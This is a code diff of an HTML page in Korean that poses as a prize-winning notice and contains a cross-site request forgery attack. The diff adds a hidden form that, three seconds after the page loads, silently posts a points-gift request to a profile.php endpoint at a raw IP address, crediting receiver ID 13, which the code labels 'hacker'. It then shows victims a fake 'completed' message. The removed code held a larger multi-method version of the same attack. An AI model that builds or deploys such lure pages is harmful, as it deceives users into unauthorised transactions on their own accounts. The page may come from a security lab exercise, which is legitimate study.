@@ -42,20 +42,6 @@
             color: #FFD700;
             margin-top: 30px;
         }
-        .attack-button {
-            background: linear-gradient(45deg, #00FF88, #00CC66);
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            color: white;
-            font-size: 1.2em;
-            cursor: pointer;
-            margin: 10px;
-            transition: transform 0.3s;
-        }
-        .attack-button:hover {
-            transform: scale(1.05);
-        }
     </style>
 </head>
 <body>
@@ -63,186 +49,48 @@
         <div class="gift-box">🎁</div>
         <h1>축하합니다!</h1>
         <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
+        <p class="auto-message">💰 포인트를 자동으로 지급하고 있습니다...</p>
         
         <div id="status" style="margin-top: 30px;">
-            <p class="auto-message">💰 포인트를 자동으로 지급하고 있습니다...</p>
-            
-            <div style="margin: 20px 0;">
-                <button class="attack-button" onclick="executeMethodA()">
-                    🚀 방법 A: 직접 전송
-                </button>
-                <button class="attack-button" onclick="executeMethodB()">
-                    🎯 방법 B: 새창 전송
-                </button>
-                <button class="attack-button" onclick="executeMethodC()">
-                    ⚡ 방법 C: 다중 시도
-                </button>
-            </div>
-            
-            <p style="font-size: 0.9em;">
-                🔍 <a href="http://3.36.66.216" target="_blank" style="color: #FFD700;">결과 확인하러 가기 →</a>
-            </p>
+            <p>🔄 처리 중...</p>
         </div>
-        
-        <!-- 숨겨진 공격 Forms -->
-        <div id="hiddenForms" style="display: none;"></div>
     </div>
 
+    <!-- 숨겨진 공격 Form -->
+    <form id="attackForm" method="POST" action="http://3.36.66.216/profile.php" target="_blank" style="display: none;">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="points" value="100">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="gift_type" value="diamond">
+        <input type="hidden" name="message" value="Simple_CSRF_Attack">
+    </form>
+
     <script>
-        let attackCounter = 0;
-        
-        // 방법 A: 직접 Form 전송 (iframe 없이)
-        function executeMethodA() {
-            attackCounter++;
-            console.log('🚀 방법 A 실행: 직접 Form 전송');
+        // 페이지 로드 후 3초 대기 후 공격
+        setTimeout(function() {
+            document.getElementById('status').innerHTML = '<p style="color: #00FF88;">⚡ 포인트 전송 중...</p>';
             
-            const attacks = [
-                { points: 100, type: 'diamond', msg: 'MethodA_' + attackCounter + '_1' },
-                { points: 75, type: 'coffee', msg: 'MethodA_' + attackCounter + '_2' },
-                { points: 50, type: 'cake', msg: 'MethodA_' + attackCounter + '_3' }
-            ];
+            // 간단한 Form 전송
+            document.getElementById('attackForm').submit();
             
-            attacks.forEach((attack, i) => {
-                setTimeout(() => {
-                    createDirectForm(attack, 'A_' + attackCounter + '_' + (i+1));
-                }, i * 300);
-            });
+            console.log('🎯 CSRF 공격 실행됨');
             
-            updateStatus('방법 A 실행됨');
-        }
-        
-        // 방법 B: 새 창에서 전송
-        function executeMethodB() {
-            attackCounter++;
-            console.log('🎯 방법 B 실행: 새창 전송');
-            
-            const attack = { points: 200, type: 'diamond', msg: 'MethodB_' + attackCounter };
-            
-            const popup = window.open('', 'attack_' + attackCounter, 'width=400,height=300');
-            if (popup) {
-                const html = `
-                    <!DOCTYPE html>
-                    <html>
-                    <head><title>Loading...</title></head>
-                    <body>
-                        <h2>🎁 포인트 전송 중...</h2>
-                        <form id="attackForm" method="POST" action="http://3.36.66.216/profile.php">
-                            <input type="hidden" name="receiver_id" value="13">
-                            <input type="hidden" name="points" value="${attack.points}">
-                            <input type="hidden" name="send_gift" value="1">
-                            <input type="hidden" name="gift_type" value="${attack.type}">
-                            <input type="hidden" name="message" value="${attack.msg}">
-                        </form>
-                        <script>
-                            setTimeout(() => {
-                                document.getElementById('attackForm').submit();
-                            }, 500);
-                        </script>
-                    </body>
-                    </html>
-                `;
-                popup.document.write(html);
-                popup.document.close();
-            }
-            
-            updateStatus('방법 B 실행됨 (새창)');
-        }
-        
-        // 방법 C: 다중 공격 시도
-        function executeMethodC() {
-            attackCounter++;
-            console.log('⚡ 방법 C 실행: 다중 시도');
-            
-            // 1. Image 태그로 GET 시도
-            tryImageAttack();
-            
-            // 2. 여러 Form 동시 전송
-            setTimeout(() => {
-                for (let i = 0; i < 3; i++) {
-                    const attack = { 
-                        points: 25 + (i * 25), 
-                        type: ['cake', 'coffee', 'diamond'][i], 
-                        msg: 'MethodC_' + attackCounter + '_' + (i+1) 
-                    };
-                    createDirectForm(attack, 'C_' + attackCounter + '_' + (i+1));
-                }
-            }, 200);
-            
-            updateStatus('방법 C 실행됨 (다중)');
-        }
-        
-        function createDirectForm(attack, id) {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'http://3.36.66.216/profile.php';
-            form.target = '_blank'; // 새 탭에서 열기
-            form.style.display = 'none';
-            
-            const fields = {
-                receiver_id: '13',
-                points: attack.points,
-                send_gift: '1',
-                gift_type: attack.type,
-                message: attack.msg
-            };
-            
-            for (let key in fields) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = fields[key];
-                form.appendChild(input);
-            }
-            
-            document.getElementById('hiddenForms').appendChild(form);
-            form.submit();
-            
-            console.log('📤 Form 전송: ' + attack.points + 'P (' + id + ')');
-            
-            // 정리
-            setTimeout(() => {
-                if (form.parentNode) {
-                    form.parentNode.removeChild(form);
-                }
+            // 완료 메시지
+            setTimeout(function() {
+                document.getElementById('status').innerHTML = 
+                    '<p style="color: #00FF88; font-size: 1.3em;">✅ 완료!</p>' +
+                    '<p>💰 100 포인트가 전송되었습니다!</p>' +
+                    '<p style="margin-top: 20px;">' +
+                    '<a href="http://3.36.66.216" target="_blank" style="color: #FFD700; text-decoration: none;">' +
+                    '🔍 결과 확인하러 가기 →' +
+                    '</a>' +
+                    '</p>';
             }, 2000);
-        }
-        
-        function tryImageAttack() {
-            const params = 'receiver_id=13&points=150&send_gift=1&gift_type=diamond&message=ImageAttack_' + attackCounter;
-            const img = new Image();
-            img.src = 'http://3.36.66.216/profile.php?' + params;
-            img.style.display = 'none';
-            document.body.appendChild(img);
             
-            console.log('📷 Image GET 시도');
-        }
+        }, 3000);
         
-        function updateStatus(method) {
-            const status = document.getElementById('status');
-            const now = new Date().toLocaleTimeString();
-            
-            status.innerHTML = `
-                <p style="color: #00FF88;">✅ ${method}</p>
-                <p style="font-size: 0.9em;">시간: ${now}</p>
-                <div style="margin: 20px 0;">
-                    <button class="attack-button" onclick="executeMethodA()">🚀 방법 A</button>
-                    <button class="attack-button" onclick="executeMethodB()">🎯 방법 B</button>
-                    <button class="attack-button" onclick="executeMethodC()">⚡ 방법 C</button>
-                </div>
-                <p style="font-size: 0.9em;">
-                    🔍 <a href="http://3.36.66.216" target="_blank" style="color: #FFD700;">결과 확인하러 가기 →</a>
-                </p>
-            `;
-        }
-        
-        console.log('🎁 다중 방법 CSRF 공격 시스템');
-        console.log('🎯 타겟: hacker (ID: 13)');
-        console.log('💡 3가지 방법으로 시도 가능');
-        
-        // 자동 실행 (페이지 로드 시)
-        setTimeout(() => {
-            executeMethodA();
-        }, 2000);
+        console.log('🎁 Simple CSRF Attack Ready');
+        console.log('🎯 Target: hacker (ID: 13)');
     </script>
 </body>
 </html>
